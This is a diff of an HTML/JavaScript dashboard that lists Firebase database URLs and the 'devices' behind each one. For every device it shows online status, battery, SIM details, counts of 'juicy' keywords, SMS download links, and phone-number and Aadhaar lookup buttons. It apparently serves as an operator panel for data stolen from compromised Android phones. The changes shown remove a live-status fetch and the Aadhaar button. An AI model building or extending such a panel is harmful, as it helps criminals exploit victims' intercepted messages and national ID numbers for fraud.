@@ -141,7 +141,7 @@
   <span class="badge" id="total-badge">—</span>
   <div class="search-bar">
     <input type="text" id="search-input" placeholder="Search URL or host…">
-    <button class="btn btn-ghost" id="refresh-btn" onclick="refreshAll()">↻ Refresh All</button>
+    <button class="btn btn-ghost" id="refresh-btn" onclick="loadUrls()">↻ Refresh</button>
   </div>
 </header>
 
@@ -414,45 +414,18 @@ document.getElementById('search-input').addEventListener('input', async () => {
 async function openUrl(id) {
   document.getElementById('view-urls').classList.remove('active');
   document.getElementById('view-devices').classList.add('active');
-  document.getElementById('device-tbody').innerHTML = `<tr><td colspan="13"><div class="loading"><div class="spinner"></div><br>Fetching live data from Firebase…</div></td></tr>`;
+  document.getElementById('device-tbody').innerHTML = `<tr><td colspan="13"><div class="loading"><div class="spinner"></div><br>Loading devices…</div></td></tr>`;
   currentUrlId = id;
 
-  // Step 1: fetch live status directly from Firebase (fast, lightweight)
-  let liveStatusMap = {};  // deviceId → {status, battery, brand}
-  try {
-    const liveRes = await fetch(`/api/url/${id}/live`);
-    const liveData = await liveRes.json();
-    if (liveData.devices) {
-      for (const d of liveData.devices) liveStatusMap[d.deviceId] = d;
-    }
-  } catch (e) { /* ignore, fall back to cached */ }
-
-  // Step 2: load full cached data (SIM, juicy, enriched IDs etc.)
   const res = await fetch(`/api/url/${id}`);
   const data = await res.json();
   currentDevices = data.devices || [];
 
-  // Merge live status into cached device list
-  for (const dev of currentDevices) {
-    const live = liveStatusMap[dev.deviceId];
-    if (live) {
-      dev.status  = live.status;   // override with fresh status
-      dev.battery = live.battery;  // override with fresh battery
-    }
-  }
-  // Re-sort: online first
-  currentDevices.sort((a, b) => {
-    if (a.status !== b.status) return a.status === 'online' ? -1 : 1;
-    return b.juicyKeywords.length - a.juicyKeywords.length;
-  });
-
-  // Header
   const online  = currentDevices.filter(d => d.status === 'online').length;
   const offline = currentDevices.length - online;
   const juicy   = currentDevices.filter(d => d.juicyKeywords.length > 0).length;
   const sim1    = currentDevices.filter(d => d.sim1Clean).length;
   const host    = data.url.replace('https://','').replace('-default-rtdb.firebaseio.com','');
-  const liveCount = Object.keys(liveStatusMap).length;
 
   document.getElementById('url-detail-header').innerHTML = `
     <div>
@@ -464,12 +437,10 @@ async function openUrl(id) {
       <span class="badge-sm badge-green">${online} online</span>
       <span class="badge-sm badge-red">${offline} offline</span>
       ${juicy ? `<span class="badge-sm badge-yellow">🎯 ${juicy} juicy</span>` : ''}
-      ${liveCount ? `<span class="badge-sm" style="background:rgba(34,197,94,.08);color:var(--green);font-size:11px">🔴 Live</span>` : ''}
       <span class="badge-sm" style="background:var(--bg3);color:var(--muted)">Schema ${data.schema}</span>
     </div>
   `;
 
-  // Filters
   document.getElementById('device-filters').innerHTML = `
     <button class="filter-btn active" onclick="setFilter('all',this)">All (${currentDevices.length})</button>
     <button class="filter-btn" onclick="setFilter('online',this)">🟢 Online (${online})</button>
@@ -538,7 +509,7 @@ function renderDevices() {
       <td><button class="sms-btn" onclick="openNotes(event,${currentUrlId},'${d.deviceId}')">📝</button></td>
       <td><a class="sms-btn" href="${d.smsLink}" target="_blank">📥 SMS</a>
           <button class="sms-btn" style="margin-left:4px" onclick="openSearchno(event,${currentUrlId},'${d.deviceId}','${d.brand.replace(/'/g,"\\'")}')">📞</button>
-          <button class="sms-btn" style="margin-left:4px" onclick="openSearchaadhar(event,${currentUrlId},'${d.deviceId}','${d.brand.replace(/'/g,"\\'")}')">🪪</button></td>
+          <button class="sms-btn" onclick="openNotes(event,${currentUrlId},'${d.deviceId}')">📝</button></td>
     </tr>`;
   }).join('');
 }
